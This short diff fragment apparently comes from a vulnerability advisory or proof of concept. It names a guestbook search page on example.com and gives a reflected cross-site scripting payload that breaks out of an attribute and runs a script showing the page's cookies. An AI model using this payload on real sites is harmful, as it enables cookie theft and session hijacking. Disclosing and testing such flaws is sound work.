@@ -1,0 +1,3 @@
+  http://www.example.com/guestbook/search.php
+  Put: "><script>alert(document.cookie);</script>
+
